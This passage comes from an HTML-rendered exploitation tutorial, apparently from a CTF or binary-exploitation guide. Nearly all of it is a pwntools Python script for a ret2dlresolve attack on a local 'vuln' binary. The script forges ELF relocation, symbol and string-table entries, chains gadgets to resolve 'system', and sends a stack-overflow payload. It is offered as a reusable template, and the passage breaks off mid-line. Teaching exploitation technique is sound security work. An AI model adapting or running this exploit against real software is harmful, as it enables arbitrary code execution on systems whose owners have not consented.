style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploit-script">Exploit script<a href="#exploit-script" class="hash-link" aria-label="Direct link to Exploit script" title="Direct link to Exploit script">​</a></h3>
<p>Below is a more versatile implementation of ret2dlresolve which automatically generates the objects etc.</p>
<p>Outline of how it works is it calculates the sizes of objects and the addresses of where they should go in advance, then generate the data based on that. It&#x27;s designed for you to easily be able to switch out the target rop chains, then just use <code>gen_payload()</code> with that rop chain, and the address of where it would be.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sys </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> argv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./vuln&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DT_SYMTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dynamic_value_by_tag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;DT_SYMTAB&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DT_STRTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dynamic_value_by_tag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;DT_STRTAB&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DT_JMPREL </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dynamic_value_by_tag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;DT_JMPREL&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># calculate rop size in advance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rop_size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">isinstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dl_data_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">rop_size</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syms </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">set</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">isinstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># calculate where we want to place each object</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr_jmprel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> DT_JMPREL </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> align</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> dl_data_addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr_symtab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> DT_SYMTAB </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> align</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr_jmprel</span><span class="token operator" style="color:#393A34">+</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr_strtab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr_symtab </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr_got </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr_strtab </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_jmprel </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_symtab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rel_start </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_jmprel </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sym_start   </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_symtab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    str_start </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr_strtab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_STRTAB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sym_to_reloc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmprel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    symtab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    strtab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sym </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># elf64_rela</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        jmprel </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_got</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># r_offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        jmprel </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.type</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        jmprel </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sym_start </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        jmprel </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic"># r_addend</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># elf64_sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">str_start </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">strtab</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># st_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_info (global(0x10)|function(0x2))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		        </span><span class="token comment" style="color:#999988;font-style:italic"># st_other</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_shndx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        	</span><span class="token comment" style="color:#999988;font-style:italic"># st_value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">		    </span><span class="token comment" style="color:#999988;font-style:italic"># st_size</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        strtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sym_to_reloc</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rel_start </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dlrop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">isinstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            dlrop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dispatcher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sym_to_reloc</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            dlrop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dlrop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> rop_size</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    objects </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ptr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> dl_data_addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_jmprel</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> jmprel</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_symtab</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> symtab</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_strtab</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> strtab</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> ptr </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> ptr </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            objects </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;X&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> ptr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ptr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        objects </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ptr </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> dlrop </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> objects</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leave_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">35</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> leave_ret</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">read_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dispatcher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x401020</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rsi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> writable</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0xc00</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rbp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rsi</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;printf&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;system&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">initial_rop  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;a&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">initial_rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rbp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">initial_rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">read_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">initial_rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;b&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" 